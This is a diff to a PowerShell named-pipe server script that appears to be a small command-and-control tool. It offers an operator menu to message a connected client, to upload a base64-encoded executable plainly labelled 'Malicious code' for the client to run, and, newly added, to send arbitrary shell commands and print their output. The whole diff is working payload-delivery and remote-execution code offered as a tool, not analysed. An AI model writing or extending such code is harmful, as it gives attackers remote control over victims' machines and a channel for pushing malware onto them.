@@ -16,29 +16,48 @@ try{
     $sw.AutoFlush=$true
 
     while ($pipeServer.IsConnected){
-        $action = Read-Host "What action do you want to do ?
-        1. Run Malicious code
-        2. Send message to client
-        3. Quit
-        "
+        $action = Read-Host "What action do you want to do ?  
+        1. Send message to client
+        2. Run Malicious code
+        3. Run Command
+        4. Quit
+"
         
         if ($action -eq 1){
-            Write-Host "Uploading malicious payload to client"
             $sw.WriteLine("action=1")
-            $assemblyPath = 'D:\Programming\C#\YahudScript\Malcode\Malcode.exe'
-            $assemblyByte = [System.IO.File]::ReadAllBytes($assemblyPath)
-            $assemblyString = [System.Convert]::ToBase64String($assemblyByte)
-            $sw.WriteLine($assemblyString) # Server sending to the client
-        }
-        elseif ($action -eq 2){
-            $sw.WriteLine("action=2")
             while($msg -ne "stop"){
                 $msg = Read-Host "Enter your message to send"
                 $sw.WriteLine($msg)
             }
         }
-        else{
+        elseif ($action -eq 2){
+            $sw.WriteLine("action=2")
+            Write-Host "Uploading malicious payload to client"
+            $assemblyPath = 'D:\Programming\C#\YahudScript\Malcode\Malcode.exe'
+            $assemblyByte = [System.IO.File]::ReadAllBytes($assemblyPath)
+            $assemblyString = [System.Convert]::ToBase64String($assemblyByte)
+            $sw.WriteLine($assemblyString) # Server sending to the client
+
+        }
+        elseif ($action -eq 3){
             $sw.WriteLine("action=3")
+            Write-Host "Sending commands to client"
+            $command = Read-Host "Run command : "
+            $sw.WriteLine($command)
+
+            # Receive command result lenght from the client
+            $lenght = [int]$sr.ReadLine()
+
+            #Output the command result
+            for($cpt = 0; $cpt -lt $lenght; $cpt++){
+                $result = $sr.ReadLine()
+                Write-Host $result
+            }
+
+
+        }
+        elseif ($action -eq 4){
+            $sw.WriteLine("action=4")
             $sw.Dispose()
             $pipeServer.Dispose()
         }
